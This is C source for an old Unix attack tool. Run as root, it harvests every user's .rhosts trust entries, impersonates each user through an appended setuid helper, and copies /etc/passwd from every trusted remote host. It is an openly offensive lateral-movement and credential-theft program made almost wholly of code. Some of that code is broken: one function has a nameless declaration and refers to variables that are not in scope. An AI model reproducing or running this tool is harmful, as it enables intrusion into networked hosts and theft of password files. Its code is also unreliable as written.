/* ut-rcp.c
   util for tsf.

   when root, will check every ~/.rhosts, build up a list and
   validate all addreses then try to rcp from them. it skips
   files it already has. you need to be root. and its very
   LOUD, ie if you run this your going to get yourself noticed.
   fast.c is appended to the end of this, a fast 'setuid&setgid'
   prog.

   note: enable NOCHECK if you have a braindead name resolver.
         and make sure you are not on something that DOESNT
         support the rcp user@host:filename format (ie other
         words, sun3.5+ etc);

                               so it was a quick hack..
#define NOCHECK 1
#define DEBUG   1
*/

#include <stdio.h>
#include <sys/file.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifndef NOCHECK
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#endif

struct lent {
        struct lent *next;
        char *hname;
        char *remuser;
        unsigned char ad1,ad2,ad3,ad4;
        int uid,gid;
};

struct lent *start,*cur;

long totalhosts=0L,
     totalusers=0L,
     validhosts=0L;

#ifndef NOCHECK
char *get_add(host,a1,a2,a3,a4)
char *host;
unsigned char *a1,*a2,*a3,*a4;
{
   struct hostent *he;
   struct sockaddr_in sok;
   static char hostname[128];

   sethostent(1);

   if ((he=gethostbyname(host))) {
         bcopy(he->h_addr, &sok.sin_addr, he->h_length);
         strcpy(hostname,he->h_name);
   } else {
         strcpy(hostname, host);
         sok.sin_family = AF_INET;
         if ((sok.sin_addr.s_addr=inet_addr(host)) == -1)
                hostname[0]=0;
   }

   if(hostname[0]) {
        *a1 = sok.sin_addr.S_un.S_un_b.s_b1;
        *a2 = sok.sin_addr.S_un.S_un_b.s_b2;
        *a3 = sok.sin_addr.S_un.S_un_b.s_b3;
        *a4 = sok.sin_addr.S_un.S_un_b.s_b4;
    } else {
        *a1 = *a2 = *a3 = *a4 = (unsigned char)0;
    }

   endhostent();
   return(hostname);
}
#endif

int f_exist(fn)
char *fn;
{
    FILE *fp;
    int;

    if(fp=fopen(fn,"r")) {
        ok=1;
        fclose(fp);
    } else ok=0;
    if(ok) printf("Skipping: %s.\n",st->hname);
    return(ok);
}

void main(argc,argv)
int argc;
char *argv[];
{
    struct passwd *pw,*getpwent();
    FILE *fp;
    char buf[255];
    char *ptr,*st,*realhname;
    unsigned char a1,a2,a3,a4;
    struct lent *tmp;

    start=cur=NULL;

    printf("Compiling list of .rhosts...\n");
    setpwent();
    while((pw=getpwent())) {
        sprintf(buf,"%s%s.rhosts",
                pw->pw_dir,(pw->pw_dir[strlen(pw->pw_dir)-1]=='/')?"":"/");
        if(fp=fopen(buf,"r")) {
              printf("Found: %s ...\n",buf);
              fflush(stdout);
              totalusers++;
              while(!feof(fp)) {
                    buf[0]=0;
                    fgets(buf,255,fp);
                    buf[strlen(buf)-1]=0;
                    if(buf[0]) {
                         for(st=buf;(*st && (*st==' '));st++);
                         for(ptr=st;(*ptr && (*ptr!=' '));ptr++);
                         *ptr++ = 0;
                         if(*st) {
#ifdef NOCHECK
                            realhname=st;
                            a1 = a2 = a3 = a4 = (unsigned char)0;
#else
                            realhname=get_add(st, &a1,&a2,&a3,&a4);
#endif
                            if(realhname[0]) {
                               tmp=(struct lent *)malloc(sizeof(struct lent));
                               tmp->hname=(char *)malloc(strlen(realhname)+1);
                               strcpy(tmp->hname,realhname);
                               tmp->ad1=a1; tmp->ad2=a2;
                               tmp->ad3=a3; tmp->ad4=a4;
                               tmp->uid=pw->pw_uid; tmp->gid=pw->pw_gid;
                               while(*ptr && ((*ptr==' ')||(*ptr=='\t')) )
                                   ptr++;
                               if(*ptr) {
                                 tmp->remuser=(char *)malloc(strlen(ptr)+1);
                                 strcpy(tmp->remuser,ptr);
                               } else tmp->remuser=NULL;
                               totalhosts++;

#ifdef DEBUG
      printf("U: %s (%d/%d) H: %s [%d.%d.%d.%d]%s%s\n",
              pw->pw_name,
              tmp->uid, tmp->gid,
              tmp->hname,
              tmp->ad1, tmp->ad2, tmp->ad3, tmp->ad4,
              (tmp->remuser)?" RU: ":"", (tmp->remuser)?tmp->remuser:"");
      fflush(stdout);
#endif
                                if(!cur) start=tmp;
                                else cur->next=tmp;
                                tmp->next=NULL;
                                cur=tmp;
                            } /* (realhname[0]) */
                        } /* (*st) */
                    } /* (buf[0]) */
              } /* (!feof(fp)) */
         fclose(fp);
        } /* fp=fopen.. */
    } /* pw=get... */

    printf("Starting mass rcp run ...\n");

    while(start) {
       if(!f_exist(start->hname)) {
                sprintf(buf,"./fast %d %d rcp %s%s%s:/etc/passwd %s",
                  start->uid, start->gid,
                  (start->remuser)?start->remuser:"", (start->remuser)?"@":"",
                  start->hname, start->hname);
                printf("Trying rcp %s ... ",start->hname);
                fflush(stdout);
                system(buf);
                if(f_exist(start->hname)) {
                    chown(start->hname,getuid(),getgid());
                    ++validhosts;
                } else printf("un");
                printf("successfull.\n");
       }
       fflush(stdout);
       tmp=start;
       start=start->next;
       if(tmp->hname) free(tmp->hname);
       if(tmp->remuser) free(tmp->remuser);
       free(tmp);
    }
        printf("Total: %ld users, %ld hosts, %ld passwds\n",
                totalusers, totalhosts, validhosts);
}

/* the following is 'fast.c' , a simple su type program */
/*

#include <stdio.h>

void main(argc,argv)
int argc;
char *argv[];
{
  if((!setgid(atoi(argv[2]))) &&
     (!setuid(atoi(argv[1]))))
    execvp(argv[3], &argv[3]);
  exit(-1);
}

*/
